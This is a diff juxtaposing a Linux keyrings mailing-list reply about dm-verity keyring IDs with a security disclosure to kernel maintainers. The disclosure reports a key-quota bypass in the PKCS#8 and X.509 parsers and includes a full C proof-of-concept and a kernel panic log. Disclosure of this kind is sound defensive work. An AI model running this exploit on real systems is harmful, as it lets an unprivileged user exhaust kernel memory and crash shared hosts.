@@ -1,151 +1,546 @@
-Received: from mail-yx2-f43.google.com (mail-yx2-f43.google.com [74.125.224.171])
+Received: from mail-pz2-f36.google.com (mail-pz2-f36.google.com [74.125.228.36])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AA6F4522EF7
-	for <keyrings@vger.kernel.org>; Fri, 18 Sep 2026 19:59:48 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.224.171
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E3C8733B6F4
+	for <keyrings@vger.kernel.org>; Sat, 19 Sep 2026 08:46:14 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.36
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789761591; cv=none; b=QPjojaBDamRTXH14GZ+yFmD44k60nxJklDp+2a2KwvTVPTSKJHtnYJgrK4C599EPP20c41+wJYGpzPlwdYpRExJCWujnmE5VOOpASBcfyMim+6/gekwLNhsWW33YP1s/wkXIURYGGBz3rZT49aPIsTOuYjAQMPzmfxTA1Cs8iDE=
+	t=1789807576; cv=none; b=I/d+/pE40OfQGO8JUtuJRq/0N7OMJWg80kSv8iQuHn/P2bdQJfcSX9ciQg/SKFCSfVwHeoeck9EtmPqCAzPosE1FcC4S7+Lc9/HXGVyfx2e1YsfkglrOcJiEQU5xIXCAiYbZIPcDmY0uK3m91oN1hDuST2FKAv3yjpgRvTD9vRo=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789761591; c=relaxed/simple;
-	bh=Jv9PmI2tuRQ6a0mGkf94vkgPMQlOdZGeXzjl16O8i00=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=uLEfyGeFdnm7JySBzuTXvRE63tQV9hoKtkseaWzXJQfb6Mn4hDQAKZ56ad46qlfnV1caQ4LqLr4j4cPBsMFO1PYjntWJk/s6/rbeHsS8+N7fVXi27CDobaWxjByOP0JwCgrJ6ZA8cE7ipE+eHwrbGIwqyU9TZdzZT36jdUrSc/g=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=amutable.com; spf=pass smtp.mailfrom=amutable.com; dkim=pass (2048-bit key) header.d=amutable-com.20251104.gappssmtp.com header.i=@amutable-com.20251104.gappssmtp.com header.b=ch2e604T; arc=none smtp.client-ip=74.125.224.171
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=amutable.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=amutable.com
+	s=arc-20240116; t=1789807576; c=relaxed/simple;
+	bh=BL/zeeS9PlU11y46O+fMur+gNoev984KLWe0pALA/pQ=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=sJwgIYPFwlItWb1emOb+l5Y0tuKqUMXa70RN+cOx4DU1986h/udZccIVmlj87CjLmYWzl2/ty2J3vFS23ivPbGuExsvIHuNbg7X0MX+z+DqnNCYkNBCb71ZDhG5CinYSsBPw1LtxQ3Dth0IXZIruyTMjPkc2pbw+hYba/xW7EcU=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=lkbNoZ6U; arc=none smtp.client-ip=74.125.228.36
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=amutable-com.20251104.gappssmtp.com header.i=@amutable-com.20251104.gappssmtp.com header.b="ch2e604T"
-Received: by mail-yx2-f43.google.com with SMTP id 956f58d0204a3-66fabb1a601so1098322d50.3
-        for <keyrings@vger.kernel.org>; Fri, 18 Sep 2026 12:59:48 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="lkbNoZ6U"
+Received: by mail-pz2-f36.google.com with SMTP id 41be03b00d2f7-cc1cea34f01so1287702a12.1
+        for <keyrings@vger.kernel.org>; Sat, 19 Sep 2026 01:46:14 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=amutable-com.20251104.gappssmtp.com; s=20251104; t=1789761587; x=1790366387; darn=vger.kernel.org;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=jFiXSu2V4pZ+QeomBn1c5HcWy5gtnzTo7Z55CduAixo=;
-        b=ch2e604TIxvi8hLh6mLXV0Kd6bTBiZI6iola+whhEHBQ/gRtNMLO9+O8h75SUTlcSD
-         ct4Fq4vTT/VWzsVFSc3o1K507n3fGuVDlzN1p1N7Lkdt1Oewd4iWhDCX9oexGV0yw1Uf
-         x2xfQyWszMMyEtpwNcapqacbwvHOBZrrOHwghHYVKP+FpxGbDBAq6+cwPnqMOmdXT/Wp
-         RmREmPUaX2sGnpVAZP5EJ1ONwPxNa2rNIQ/a9maVbyLwwsluXGxl9TM9z9D6C+ZEnGU5
-         8BEMTctHx5RvzLgo9Lu01MauixY+qjScYIhLTGc4EVl9uKr4tRuCeerFP6EutvGdfkxX
-         Sdmg==
+        d=gmail.com; s=20251104; t=1789807574; x=1790412374; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=YUu/lRQGAG8FHMHbB8+mlasCEqI53+jgyp91Gu8REJ0=;
+        b=lkbNoZ6UEK2eejJVuudLwG68ZMO3+B24kpod+5y7otTXWn50mfx1HUV0+sMWfoKrvC
+         VG24yq8bzys8bEzoEG9OQcq+glZgTJlMca1JsmkovDpWFGk4VEurELjk6NIiu4O5Cao7
+         fPwP1dCiycWQx2TBpBi/OBg+t6VL+gEGRoLR1qvvaB+sNq+v5kS6VsGryHj8SOhVVR87
+         ttMewljb8SelN4Y2ZWgC0R68rkzZwFZ2zmFaJYYnvN8DBePWygU+IWKJqxfb3mTW8Ocz
+         q6ruK+wqDUnknqI18vpLhnVsrmRhAQvBYP7VTXj8tVmNpcgNqPs8dsyr6VHJBKuXEeEp
+         YIoQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1789761587; x=1790366387;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=jFiXSu2V4pZ+QeomBn1c5HcWy5gtnzTo7Z55CduAixo=;
-        b=tRbOJRVAIO4hhsqz26tSxwrvb28moLkC1fWCc3EOGsyG0XP3IhFfjuF8dk8bdnbhMR
-         HaD/vkt/O1LWZNjIQ3b19Hh+u2HoWNzcIEkHLkRWbnp1CLmZtTCxVycPNMpQ2pcjFTxy
-         JEwlCDXEsQIevGNeCwuK4z92x/3ofZL0KPdhMQyTnmIdMu3KumwA8FwaQJe/QiE7n8bU
-         U+iJu1Laxg9qseMF0Q+Jnbi10rbiRt6HDL8cyfLTR0IDuveX5Sgv8j1JpR/K19D+/Hgd
-         1OJiOM+xEFuXoMSzhqaOhtm4qnNUIN4WpgDdObP+uNcrL8IqgVEInXkOeWVSmAilvnYW
-         mcxA==
-X-Forwarded-Encrypted: i=1; AKwUvBxuWIibTa3KglEoheMg3tZAst8KAv6p/UIcuZUpnTWLMOCyjfUVOq95CVYp2bEToohTfShmgQ7F6A==@vger.kernel.org
-X-Gm-Message-State: AFuF++likudKs7N1yfoggLW7qz76JKAt0jPMZlQONFyFO1vmdsZHsD0K
-	JlstpV5F7HXAL5bQo1Is4tlenoq4qLYGI5wpVMQamgE6uNu4uXfnjGjEeqfTeqJFn/f8
-X-Gm-Gg: AYBFou06zdsmkDUGLKFVvNCzBA7n3bdi7NIGBcwil9A37uhu04+sYjbz3slHPLEdnsZ
-	ZCL5XWvB/wVEe3rkRrt4iN4AJ/1KiFGeJSkhhA0jZQ7xIeCg5lOIg8bnqpisS/j227Go5UUlYoE
-	VBpegZZFhjrTyfeK9iCPTYPLBEpc+PIASOxW9qIWz4JVEOQgF20gVTlDDVK9raavBMHVMXR5B19
-	TyKVBR8Hz7bkVP9cstMhHQ7TVXL7mM5MhWHUekDDnoxmv5N4LuzOpqB4aHQB+k+z0CsytdeJ6wE
-	xBwe52wnLR9mnCKpmvljo7MmM1Twkni9QW0u8WqwSMQB2N0Ti1HETTtgokaIvst9ELYeK8DjIQ+
-	ljeL1B2shPZ9mntph06EYYQ/RBFZYcjxp++pTxb91xJqYtNK+niFe0MAa8Ww+3hiUAr5BRpbXsn
-	mW+LIB2NZapIlH5iKowFFnFlSTBc5VZCi6Df/kJpExTXFKfGQP0O+/myQbMWSxS2uYx6Ts0U8lD
-	yXvxQv9EsKQfkuWCx5Yua5z+cZEMbx295n1aktTl0ASjBLVflbCsg==
-X-Received: by 2002:a05:690e:e89:b0:671:4d46:8d5a with SMTP id 956f58d0204a3-6717fcee54emr1347891d50.41.1789761587246;
-        Fri, 18 Sep 2026 12:59:47 -0700 (PDT)
-Received: from toolbx (104-53-165-62.lightspeed.stlsmo.sbcglobal.net. [104.53.165.62])
-        by smtp.gmail.com with ESMTPSA id 956f58d0204a3-672990ab5desm406523d50.8.2026.09.18.12.59.45
+        d=1e100.net; s=20260707; t=1789807574; x=1790412374;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=YUu/lRQGAG8FHMHbB8+mlasCEqI53+jgyp91Gu8REJ0=;
+        b=LHbCtEqSjH64FamRkBXuTOt1/JN3n54ODCY4Bd1rDDzE/UPTzVeAUgbjMsPk6Yb+JP
+         lNiWAJi9KhjrKXB8flVlYL0/6utKcNVHY4IlMqnk/SaBzCLIZB18ijY7D1OOx99rQswS
+         /DqBq/3c+38wUbL8ptRFlFnbbSL0j2bI+JiC8I3OFM5HcJnrxWDghk+rFpayJUzb1j4r
+         1bi3+b5OHEe6QS39pSNyGNttrboeaSl5A/ORFmOHvgwFUYedM9qN+fj6O/egskxVD0RT
+         p6j16tDY187jdMt/n5DMGlA9WcubpQiExWPCwNq1zOv1DM4IZxajFZlDbQ/zY3KlDGRp
+         Rlgg==
+X-Forwarded-Encrypted: i=1; AKwUvBwBpHbr5l4SOIDZEmqcFd1sTecKPRPn4qkYFyiao9gWxkxswJB8nbA3eKMlxmTUOezoxyX5WMm9CA==@vger.kernel.org
+X-Gm-Message-State: AFuF++kzt4pzn9iFf56vOj9J5jqaKfSbxKjbvv6tgiyIxEdu/zc0+Gbz
+	kw7A1jaeVfwAoR5Cdc3kbSmgt/12bWzn7tl7MMDYPQbMDI+hL4n5vxUt
+X-Gm-Gg: AYBFou2hXW5ecsA/9zmtrvZZ7mxsAq84irIiKIIY65JN8BsM74+z8yDOSswW6AxV/10
+	a44xTZP1F06lAWiAB2Zh+5XHATyOF3VO082kBDL3ZlBNJZd5qTsNCyqQIQi0+x5K3FpUFXEJio6
+	3dV/uJg0DBQG8YOvkoT5W4G4dC13onYj+K/us4Kf9buZl3MwAsbPnzd5v8pXM8Pj/pJ7pV7rGH3
+	hA5orcnwIYs656LtCKzGp6E8E8CBFQi9/lfdAx45iZXVfFxvmJ585YZMxFeXpGqMbkvtK7j/cJH
+	tzsBjwLQegAz24e94VH2/KV+4Osi50nKgJbZxLTPbectd8nsR4XYQZejoM2mvLmcUZskT+TOxZH
+	tzQAE8dYJQJw/XP1bfkSkXppzDmimxkh/Hbwuith1nGAwUZbtT6K3117Q8XgWATcsI/PtAdIGJB
+	D3ObfVU4w0J9m6bFVvJJWyt49VgrsiuRIxgzjzGal4CDH9252Up47J0AX5zZOUVzneFDA4ajyil
+	cqPViY1CHirSEAi8wX+QOAqC6v1ue8eNZmdYbHauQ5AdrTkxq8HGklyZSNf59F/h6Bz3g==
+X-Received: by 2002:a17:90b:3a81:b0:39e:6a82:afd9 with SMTP id 98e67ed59e1d1-39e6a82bbe2mr3367358a91.43.1789807574075;
+        Sat, 19 Sep 2026 01:46:14 -0700 (PDT)
+Received: from lenovo-thinkbook (42-2-127-248.static.netvigator.com. [42.2.127.248])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6cae997csm3490897a91.11.2026.09.19.01.46.10
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Fri, 18 Sep 2026 12:59:46 -0700 (PDT)
-Date: Fri, 18 Sep 2026 14:59:49 -0500
-From: Andrew Halaney <andrew@amutable.com>
-To: David Howells <dhowells@redhat.com>
-Cc: Jarkko Sakkinen <jarkko@kernel.org>, Alasdair Kergon <agk@redhat.com>, 
-	Mike Snitzer <snitzer@kernel.org>, Mikulas Patocka <mpatocka@redhat.com>, 
-	Benjamin Marzinski <bmarzins@redhat.com>, Paul Moore <paul@paul-moore.com>, 
-	James Morris <jmorris@namei.org>, "Serge E. Hallyn" <serge@hallyn.com>, 
-	Eric Biggers <ebiggers@kernel.org>, "Theodore Y. Ts'o" <tytso@mit.edu>, 
-	Jonathan Corbet <corbet@lwn.net>, Shuah Khan <skhan@linuxfoundation.org>, 
-	Randy Dunlap <rdunlap@infradead.org>, dm-devel@lists.linux.dev, linux-kernel@vger.kernel.org, 
-	keyrings@vger.kernel.org, linux-security-module@vger.kernel.org, bpf@vger.kernel.org, 
-	fsverity@lists.linux.dev, linux-doc@vger.kernel.org, 
-	"Christian Brauner (Amutable)" <brauner@kernel.org>
-Subject: Re: [PATCH 1/3] keys: add KEY_SPEC_DM_VERITY_KEYRING
-Message-ID: <aq2VxlttdlTNlHo6@toolbx>
-References: <aqyiCavj3xeNqyAo@kernel.org>
- <20260914-ajhalaney-dmverity-key-identifier-v1-0-01922dc1366a@amutable.com>
- <20260914-ajhalaney-dmverity-key-identifier-v1-1-01922dc1366a@amutable.com>
- <715249.1789718726@warthog.procyon.org.uk>
+        Sat, 19 Sep 2026 01:46:13 -0700 (PDT)
+From: Yuqi Xu <xuyuqiabc@gmail.com>
+To: linux-crypto@vger.kernel.org
+Cc: David Howells <dhowells@redhat.com>,
+	Lukas Wunner <lukas@wunner.de>,
+	Ignat Korchagin <ignat@linux.win>,
+	Herbert Xu <herbert@gondor.apana.org.au>,
+	"David S . Miller" <davem@davemloft.net>,
+	keyrings@vger.kernel.org,
+	stable@vger.kernel.org,
+	Vega <vega@nebusec.ai>,
+	Ren Wei <weir@nebusec.ai>,
+	xuyq21@lenovo.com
+Subject: [PATCH 0/1] KEYS: Account for asymmetric key payload data in the quota
+Date: Sat, 19 Sep 2026 16:45:57 +0800
+Message-ID: <cover.1789801335.git.xuyuqiabc@gmail.com>
+X-Mailer: git-send-email 2.55.0
 Precedence: bulk
 X-Mailing-List: keyrings@vger.kernel.org
 List-Id: <keyrings.vger.kernel.org>
 List-Subscribe: <mailto:keyrings+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:keyrings+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <715249.1789718726@warthog.procyon.org.uk>
+Content-Transfer-Encoding: quoted-printable
 
-On Fri, Sep 18, 2026 at 09:05:26AM +0100, David Howells wrote:
-> Jarkko Sakkinen <jarkko@kernel.org> wrote:
-> 
-> > This is great for discussion but what we want for the commit message
-> > is just motivation and resolution.
-> 
-> Actually, I think it's useful that Andrew wrote up the issues in the commit
-> message - and I think it shows part of the motivation.  The 'writing a fake
-> /proc/keys line in the description' is something I hadn't considered.
+Hi Linux kernel maintainers,
 
-I'll defer to what you all want in the message here, I found it valuable
-but I trend on the side of overly verbose admittedly!
+We found and validated an issue in
+crypto/asymmetric_keys/pkcs8_parser.c.  The bug is reachable by a
+non-root user through add_key("asymmetric", ...); it does not require a
+user or network namespace.  We've tested the fix and it should not
+affect other functionality.
 
-> 
-> > I don't think we need all this just to say that /proc/keys in a racy
-> > query mechanism for production, which is an issue for dm-verity, given
-> > that nothing else is available.
-> 
-> I think at some point, we will need a system call to search all for all
-> accessible keys matching certain criteria by actually walking the key
-> database.  The problem there is that there may be multiple hits, so we may
-> need something like:
-> 
-> 	int count = find_key(key_serial_t start_id,
-> 			     const char *type, const char *desc_prefix,
-> 			     key_serial_t *results, size_t results_size,
-> 			     unsigned int flags);
-> 
-> Allowing you to do:
-> 
-> 	key_serial_t dm_key;
-> 	int n = find_key(0, "keyring", ".dm_verity", &dm_key, 1,
-> 			 FIND_KEY_EXACT_DESC);
-> 
-> This wouldn't be as fast as a direct lookup since it would have to walk the
-> key tree, doing name comparisons and perm checks on each key of the type.
-> 
-> > And secondly special keys are meant for implicit keyrings so isn't
-> > that all there's to it?
-> 
-> I have no particular objection to setting aside a block of negative key IDs
-> for special keyrings that need to be accessed a lot - though I would make
-> common reg/unreg functions that take the ID to be registered and, say, set the
-> block at -257..-512.  Moving the BFP keyring to -257 and DM to -258.
+We will provide detailed information about the bug in this email, along
+with a reproducer.
 
-To be clear are you suggesting I do that for v2 here? Happy to make the
-change and add some reuse to the registration functions, etc. I'm
-guessing its fine to change the bpf id since its still only in -next?
+---- details below ----
 
-The only awkward bit with making that more generic is that dm-verity
-isn't __ro_after_init since its coming from a module possibly, and
-because of the module usage I also protected it with a spinlock in case
-someone's accessing it while you unload the module. Could just use one
-spinlock for the whole generic array, and drop the __ro_after_init I
-suppose.
+Bug details:
 
-Let me know if I'm not following properly!
+add_key("asymmetric", ...) preparses the supplied blob with the
+registered asymmetric key parsers and then instantiates the key with
+generic_key_instantiate(), which charges prep->quotalen to the owning
+user's key quota through key_payload_reserve().
 
-Thanks,
-Andrew
+pkcs8_parse() ASN.1-decodes the outer PKCS#8 structure and duplicates
+the attacker-controlled PrivateKey OCTET STRING with
+kmemdup(ctx.key, ctx.key_size, GFP_KERNEL) into pub->key.
+pkcs8_key_preparse() then stores that object persistently in the
+asymmetric-key payload, but hard-codes
+
+    prep->quotalen =3D 100;
+
+so the quota records only 100 bytes regardless of the retained private
+key size.  The ASN.1 decoder accepts blobs up to 65535 bytes, so one key
+can pin about 64 KiB of kernel memory while consuming 100 quota bytes.
+With the default non-root limits (200 keys / 20000 bytes) a user can
+retain roughly 12 MiB of kernel memory instead of the 20 KiB the limit
+is meant to allow.
+
+x509_key_preparse() has the same problem: it keeps the parsed public
+key, its parameters, the signature, the key IDs and the authority key
+IDs, but also charges a fixed 100 bytes.  The same add_key() call
+reaches the X.509 parser, so fixing only PKCS#8 would leave the bypass
+reachable; the patch accounts
+for the retained payload in both parsers.
+
+Measured on v7.3-rc1 (10396a2d6d41), 2 vCPU / 2 GiB QEMU guest.  The
+test drops to uid 1000 and adds PKCS#8 keys with a 65000-byte
+PrivateKey field through add_key("asymmetric", ...):
+
+Before the patch (/proc/key-users, uid 1000):
+  1000:     5 5/5 5/200 259/20000
+  added 176 keys; last add_key: -1 errno=3D122 (Disk quota exceeded)
+  1000:   182 182/181 181/200 19971/20000
+176 keys retained about 11.4 MiB of kernel memory, but were charged only
+19971 - 259 =3D 19712 bytes in total, about 112 bytes per key.
+
+After the patch:
+  1000:     5 5/5 5/200 1139/20000
+  added 0 keys; last add_key: -1 errno=3D122 (Disk quota exceeded)
+The oversized key is rejected immediately, while a small PKCS#8 key
+(200-byte PrivateKey) still loads and is charged 264 bytes.
+
+The same holds for a small X.509 certificate whose only large object is
+a 26000-byte authorityKeyIdentifier key ID: the patch rejects it, while
+the unpatched kernel accepted it and charged 109 bytes.
+
+The panic log below was captured by the report during the initial
+validation.
+
+Reproducer:
+
+  gcc -O2 -static -o poc poc.c
+  ./poc
+
+Run the PoC as an unprivileged user; no namespace is needed.  We run it
+in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+
+#define _GNU_SOURCE
+
+#include <errno.h>
+#include <inttypes.h>
+#include <linux/keyctl.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
+
+typedef int32_t key_serial_t;
+
+struct options {
+	size_t payload_size;
+	size_t key_count;
+	size_t anon_mb;
+	unsigned pause_secs;
+	bool revoke_on_exit;
+};
+
+static void usage(const char *prog)
+{
+	fprintf(stderr,
+		"Usage: %s [--payload-size BYTES] [--key-count N] [--anon-mb MB]\n"
+		"          [--pause SECS] [--revoke-on-exit]\n",
+		prog);
+}
+
+static size_t der_len_bytes(size_t len)
+{
+	size_t n =3D 0;
+
+	if (len < 0x80)
+		return 1;
+
+	while (len) {
+		n++;
+		len >>=3D 8;
+	}
+
+	return 1 + n;
+}
+
+static size_t der_put_len(unsigned char *dst, size_t len)
+{
+	size_t n =3D 0;
+	size_t tmp =3D len;
+
+	if (len < 0x80) {
+		dst[0] =3D (unsigned char)len;
+		return 1;
+	}
+
+	while (tmp) {
+		n++;
+		tmp >>=3D 8;
+	}
+
+	dst[0] =3D 0x80 | n;
+	for (size_t i =3D 0; i < n; i++)
+		dst[1 + i] =3D (unsigned char)(len >> ((n - 1 - i) * 8));
+
+	return 1 + n;
+}
+
+static unsigned char *build_pkcs8(size_t payload_size, size_t *blob_len_out)
+{
+	static const unsigned char algo_id[] =3D {
+		0x30, 0x0d,
+		0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7,
+		0x0d, 0x01, 0x01, 0x01,
+		0x05, 0x00,
+	};
+	const size_t octet_total =3D 1 + der_len_bytes(payload_size) + payload_siz=
+e;
+	const size_t seq_content_len =3D 3 + sizeof(algo_id) + octet_total;
+	const size_t blob_len =3D 1 + der_len_bytes(seq_content_len) + seq_content=
+_len;
+	unsigned char *blob;
+	unsigned char *p;
+
+	blob =3D malloc(blob_len);
+	if (!blob)
+		return NULL;
+
+	p =3D blob;
+	*p++ =3D 0x30;
+	p +=3D der_put_len(p, seq_content_len);
+
+	*p++ =3D 0x02;
+	*p++ =3D 0x01;
+	*p++ =3D 0x00;
+
+	memcpy(p, algo_id, sizeof(algo_id));
+	p +=3D sizeof(algo_id);
+
+	*p++ =3D 0x04;
+	p +=3D der_put_len(p, payload_size);
+
+	for (size_t i =3D 0; i < payload_size; i++)
+		p[i] =3D (unsigned char)(i * 131u + 7u);
+	p +=3D payload_size;
+
+	if ((size_t)(p - blob) !=3D blob_len) {
+		fprintf(stderr, "internal length mismatch: %zu !=3D %zu\n",
+			(size_t)(p - blob), blob_len);
+		free(blob);
+		return NULL;
+	}
+
+	*blob_len_out =3D blob_len;
+	return blob;
+}
+
+static long add_key_syscall(const char *type, const char *desc,
+			    const void *payload, size_t plen,
+			    key_serial_t ringid)
+{
+	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
+}
+
+static long keyctl_syscall(int cmd, unsigned long arg2, unsigned long arg3,
+			   unsigned long arg4, unsigned long arg5)
+{
+	return syscall(SYS_keyctl, cmd, arg2, arg3, arg4, arg5);
+}
+
+static void *spray_anon(size_t anon_mb)
+{
+	const size_t bytes =3D anon_mb * 1024ULL * 1024ULL;
+	const long page_size =3D sysconf(_SC_PAGESIZE);
+	unsigned char *mapping;
+
+	if (!anon_mb)
+		return NULL;
+
+	mapping =3D mmap(NULL, bytes, PROT_READ | PROT_WRITE,
+		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (mapping =3D=3D MAP_FAILED) {
+		perror("mmap anon");
+		return NULL;
+	}
+
+	for (size_t off =3D 0; off < bytes; off +=3D (size_t)page_size)
+		mapping[off] =3D (unsigned char)(off / (size_t)page_size);
+
+	printf("[*] touched %zu MiB of anonymous memory\n", anon_mb);
+	fflush(stdout);
+	return mapping;
+}
+
+static unsigned long parse_u64(const char *name, const char *value)
+{
+	char *end =3D NULL;
+	unsigned long long out;
+
+	errno =3D 0;
+	out =3D strtoull(value, &end, 0);
+	if (errno || !end || *end) {
+		fprintf(stderr, "bad value for %s: %s\n", name, value);
+		exit(1);
+	}
+
+	return (unsigned long)out;
+}
+
+int main(int argc, char **argv)
+{
+	struct options opt =3D {
+		.payload_size =3D 65000,
+		.key_count =3D 178,
+		.anon_mb =3D 700,
+		.pause_secs =3D 0,
+		.revoke_on_exit =3D false,
+	};
+	unsigned char *blob =3D NULL;
+	size_t blob_len =3D 0;
+	key_serial_t *serials =3D NULL;
+	void *anon_mapping =3D NULL;
+	size_t added =3D 0;
+	char ring_name[64];
+	int ret =3D 0;
+
+	for (int i =3D 1; i < argc; i++) {
+		if (!strcmp(argv[i], "--payload-size") && i + 1 < argc) {
+			opt.payload_size =3D parse_u64("--payload-size", argv[++i]);
+		} else if (!strcmp(argv[i], "--key-count") && i + 1 < argc) {
+			opt.key_count =3D parse_u64("--key-count", argv[++i]);
+		} else if (!strcmp(argv[i], "--anon-mb") && i + 1 < argc) {
+			opt.anon_mb =3D parse_u64("--anon-mb", argv[++i]);
+		} else if (!strcmp(argv[i], "--pause") && i + 1 < argc) {
+			opt.pause_secs =3D parse_u64("--pause", argv[++i]);
+		} else if (!strcmp(argv[i], "--revoke-on-exit")) {
+			opt.revoke_on_exit =3D true;
+		} else {
+			usage(argv[0]);
+			return 1;
+		}
+	}
+
+	if (opt.payload_size > (1024U * 1024U - 128U)) {
+		fprintf(stderr, "payload too large for add_key limit\n");
+		return 1;
+	}
+
+	blob =3D build_pkcs8(opt.payload_size, &blob_len);
+	if (!blob) {
+		perror("build_pkcs8");
+		return 1;
+	}
+
+	serials =3D calloc(opt.key_count, sizeof(*serials));
+	if (!serials) {
+		perror("calloc serials");
+		free(blob);
+		return 1;
+	}
+
+	snprintf(ring_name, sizeof(ring_name), "pkcs8-n6q-%ld", (long)getpid());
+	if (keyctl_syscall(KEYCTL_JOIN_SESSION_KEYRING,
+			   (unsigned long)ring_name, 0, 0, 0) < 0) {
+		perror("keyctl join_session_keyring");
+		ret =3D 1;
+		goto out;
+	}
+
+	printf("[*] payload_size=3D%zu blob_len=3D%zu key_count=3D%zu anon_mb=3D%z=
+u\n",
+	       opt.payload_size, blob_len, opt.key_count, opt.anon_mb);
+	fflush(stdout);
+
+	anon_mapping =3D spray_anon(opt.anon_mb);
+	if (opt.anon_mb && !anon_mapping) {
+		ret =3D 1;
+		goto out;
+	}
+
+	for (size_t i =3D 0; i < opt.key_count; i++) {
+		char desc[32];
+		long serial;
+
+		snprintf(desc, sizeof(desc), "k%06zu", i);
+		serial =3D add_key_syscall("asymmetric", desc, blob, blob_len,
+					 KEY_SPEC_SESSION_KEYRING);
+		if (serial < 0) {
+			fprintf(stderr,
+				"[!] add_key failed after %zu keys: errno=3D%d (%s)\n",
+				added, errno, strerror(errno));
+			ret =3D 1;
+			goto out;
+		}
+
+		serials[added++] =3D (key_serial_t)serial;
+		if ((added % 10) =3D=3D 0 || added =3D=3D 1) {
+			printf("[+] added %zu keys, last serial=3D%ld\n",
+			       added, serial);
+			fflush(stdout);
+		}
+	}
+
+	printf("[+] completed %zu successful add_key calls\n", added);
+	fflush(stdout);
+
+	if (opt.pause_secs) {
+		printf("[*] sleeping for %u seconds\n", opt.pause_secs);
+		fflush(stdout);
+		sleep(opt.pause_secs);
+	}
+
+out:
+	if (opt.revoke_on_exit) {
+		for (size_t i =3D 0; i < added; i++)
+			keyctl_syscall(KEYCTL_REVOKE, serials[i], 0, 0, 0);
+	}
+
+	if (anon_mapping)
+		munmap(anon_mapping, opt.anon_mb * 1024ULL * 1024ULL);
+	free(serials);
+	free(blob);
+	return ret;
+}
+
+------END poc.c--------
+
+----BEGIN crash log----
+
+[  291.603731][T10195] Kernel panic - not syncing: Out of memory: compulsor=
+y panic_on_oom is enabled=0D=0D
+[  291.604425][T10195] CPU: 1 UID: 1028 PID: 10195 Comm: poc Not tainted 6.=
+12.74 #3=0D=0D
+[  291.604946][T10195] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, =
+1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D=0D
+[  291.605646][T10195] Call Trace:=0D=0D
+[  291.605889][T10195]  <TASK>=0D=0D
+[  291.606112][T10195]  dump_stack_lvl+0x3b/0x1f0=0D=0D
+[  291.606466][T10195]  panic+0x6fe/0x7e0=0D=0D
+[  291.606767][T10195]  ? dump_header+0x6c2/0x950=0D=0D
+[  291.607117][T10195]  ? __pfx_panic+0x10/0x10=0D=0D
+[  291.607458][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
+[  291.607883][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
+[  291.608335][T10195]  ? out_of_memory+0x8c5/0x16b0=0D=0D
+[  291.608714][T10195]  out_of_memory+0x8f3/0x16b0=0D=0D
+[  291.609092][T10195]  ? __pfx_out_of_memory+0x10/0x10=0D=0D
+[  291.609483][T10195]  ? lock_acquire+0x2f/0xb0=0D=0D
+[  291.609824][T10195]  ? __alloc_pages_noprof+0xd59/0x26d0=0D=0D
+[  291.610258][T10195]  __alloc_pages_noprof+0x1ec3/0x26d0=0D=0D
+[  291.610688][T10195]  ? srso_alias_return_thunk+0x5/0xfbef5=0D=0D
+[  291.611102][T10195]  ? hlock_class+0x4e/0x130=0D=0D
